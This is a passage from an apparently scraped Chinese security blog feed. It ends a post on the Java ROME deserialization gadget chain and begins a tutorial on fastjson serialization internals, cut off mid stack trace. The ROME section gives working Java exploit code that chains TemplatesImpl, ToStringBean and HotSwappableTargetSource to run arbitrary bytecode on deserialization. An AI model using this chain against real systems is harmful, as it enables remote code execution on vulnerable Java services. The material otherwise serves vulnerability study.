class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h2><p>SpringBoot原生toString链，需要加载SpringBoot依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ROME<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">equals:392, XString</span><br><span class="line">equals:103, HotSwappableTargetSource</span><br><span class="line">putVal:635, HashMap</span><br><span class="line">put:612, HashMap</span><br><span class="line">main:29, ROMEHotSwappableTargetSource</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHotSwappableTargetSource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);</span><br><span class="line">        <span class="comment">//        toStringBean.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//        SerialUtils.serialize(hashMap);</span></span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本质是，如果带了ROME这个组件，可以通过调toString，达到调任意getter的目的。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://goodapple.top/archives/1145">ROME反序列化@枫</a><br><a href="https://xz.aliyun.com/t/12768">ROME反序列化@Ic4_F1ame</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;jdk8u181&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="ROME" scheme="https://jaspersec.top/tags/ROME/"/>
    
  </entry>
  
  <entry>
    <title>fastjson反序列化 基础</title>
    <link href="https://jaspersec.top/posts/1322769944.html"/>
    <id>https://jaspersec.top/posts/1322769944.html</id>
    <published>2023-12-24T04:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.231Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>fastjson是阿里巴巴旗下的一个Java库，用于Java对象和JSON字符串之间的转换。<br>这个库从2017-2022年，陆陆续续爆出了20多个反序列化RCE。<br>官方采用黑名单的方式修复漏洞，这导致出现一系列的bypass&#x3D; &#x3D;<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698293500707-b0e4f3dc-81e8-4de1-8ff1-e10572a1a178.png" alt="image.png"></p><h1 id="序列化分析"><a href="#序列化分析" class="headerlink" title="序列化分析"></a>序列化分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String hobby;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHobby</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobby</span><span class="params">(String hobby)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hobby = hobby;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, properties=&quot;</span> + properties +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="comment">// fastjson 1.2.24</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test0</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 全局配置，不进ASM动态类</span></span><br><span class="line">        SerializeConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Jasper&quot;</span>, <span class="number">22</span>, <span class="string">&quot;fuck some people&quot;</span>);</span><br><span class="line"><span class="comment">//        String s1 = JSON.toJSONString(user);</span></span><br><span class="line"><span class="comment">//        System.out.println(s1);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化后的字符串：&quot;</span>+s2);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调用了getName</span><br><span class="line">序列化后的字符串：&#123;&quot;@type&quot;:&quot;Pojo.User&quot;,&quot;age&quot;:22,&quot;hobby&quot;:&quot;fuck some people&quot;,&quot;name&quot;:&quot;Jasper&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="为什么会调getter"><a href="#为什么会调getter" class="headerlink" title="为什么会调getter"></a>为什么会调getter</h2><p>宏观上理解，为了把对象转JSON，需获取对象的属性值。要么调getter取值，要么反射取值，这里用的前者。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get:450, FieldInfo</span><br><span class="line">getPropertyValueDirect:110, FieldSerializer</span><br><span class="line">write:196, JavaBeanSerializer</span><br><span class="line">write:275, JSONSerializer</span><br><span class="line">toJSONString:559, JSON</span><br><span class="line">toJSONString:548, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698300347029-ae57f17f-9046-4224-9bdb-bac7424c4f31.png" alt="image.png"></p><h2 id="构造JSON字符串的地方"><a href="#构造JSON字符串的地方" class="headerlink" title="构造JSON字符串的地方"></a>构造JSON字符串的地方</h2><p>核心在这个try-catch里，上面的调用getter取值也在这里面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">write:196, JavaBeanSerializer</span><br><span class="line">write:275, JSONSerializer</span><br><span class="line">toJSONString:559, JSON</span><br><span class="line">toJSONString:548, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698300741065-e554dae6-0de1-450a-ac5e-64eda9222170.png" alt="image.png"></p><h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Pojo.User;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializeConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test0</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 全局配置，不进ASM动态类</span></span><br><span class="line">        SerializeConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().setAsmEnable(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Pojo.User\&quot;,\&quot;age\&quot;:22,\&quot;hobby\&quot;:\&quot;fuck some people\&quot;,\&quot;name\&quot;:\&quot;Jasper\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------parse-------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s2);</span><br><span class="line">        System.out.println(parse);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象所属类：&quot;</span>+parse.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------parseObject-----------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse1</span> <span class="operator">=</span> JSON.parseObject(s2);</span><br><span class="line">        System.out.println(parse1);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象所属类：&quot;</span>+parse1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------parseObject---------------------------&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse2</span> <span class="operator">=</span> JSON.parseObject(s2,Object.class);</span><br><span class="line">        System.out.println(parse2);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化对象所属类：&quot;</span>+parse2.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">调用了setName</span><br><span class="line">调用了getProperties</span><br><span class="line">User&#123;name=&#x27;Jasper&#x27;, age=22, hobby=&#x27;fuck some people&#x27;, properties=null&#125;</span><br><span class="line">反序列化对象所属类：Pojo.User</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">调用了setName</span><br><span class="line">调用了getProperties</span><br><span class="line">调用了getName</span><br><span class="line">调用了getProperties</span><br><span class="line">&#123;&quot;name&quot;:&quot;Jasper&quot;,&quot;age&quot;:22,&quot;hobby&quot;:&quot;fuck some people&quot;&#125;</span><br><span class="line">反序列化对象所属类：com.alibaba.fastjson.JSONObject</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">调用了setName</span><br><span class="line">调用了getProperties</span><br><span class="line">User&#123;name=&#x27;Jasper&#x27;, age=22, hobby=&#x27;fuck some people&#x27;, properties=null&#125;</span><br><span class="line">反序列化对象所属类：Pojo.User</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure><h2 id="1-根据JSON字符串封装deserializer"><a href="#1-根据JSON字符串封装deserializer" class="headerlink" title="1.根据JSON字符串封装deserializer"></a>1.根据JSON字符串封装deserializer</h2><p>宏观上看，此步骤依据一系列规则，选择出可以参与反序列化的field，存进fieldList，放入deserializer。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">build:132, JavaBeanInfo</span><br><span class="line">&lt;init&gt;:39, JavaBeanDeserializer</span><br><span class="line">createJavaBeanDeserializer:586, ParserConfig</span><br><span class="line">getDeserializer:461, ParserConfig</span><br><span class="line">getDeserializer:312, ParserConfig</span><br><span class="line">parseObject:367, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:16, Test0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698390119436-4d5e6377-6486-4a54-87a9-ffaf6d596238.png" alt="image.png"><br>当函数执行到return，获取到所有符合条件的field，里面有它对应的method，这是后面会调用到的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698390350055-073de250-31ec-43c4-9eed-c4adc8364e2c.png" alt="image.png"><br>这里面实际上就有很多分析文章里提到的，getter和setter需要满足的条件。<br>不满足下面这些if判断的method不会add进fieldList，也就不会在下一小节被调用。<br><strong>setter需满足的条件</strong><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698404119899-9ea4ec6b-bbf4-44c8-8fec-16444eb44d0a.png" alt="image.png"><br><strong>getter需满足的条件</strong><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1698404743852-cea4a5cc-dab9-43d3-b0aa-ff7f23a7f33c.png" alt="image.png"></p><h2 id="2-调用deserializer-deserialize创建并初始化对象"><a href="#2-调用deserializer-deserialize创建并初始化对象" class="headerlink" title="2.调用deserializer#deserialize创建并初始化对象"></a>2.调用deserializer#deserialize创建并初始化对象</h2><p><strong>核心逻辑就是，创建一个object变量，然后遍历前面获取的fieldList，对于每个field，调用其getter或者setter或者直接调用native set方法去给field赋值，然后返回object。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deserialze:271, JavaBeanDeserializer</span><br><span class="line">deserialze:188, JavaBeanDeserializer</span><br><span class="line">deserialze:184, JavaBeanDeserializer</span><br><span class="line">parseObject:368, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:128, JSON</span><br><span class="line">main:16, 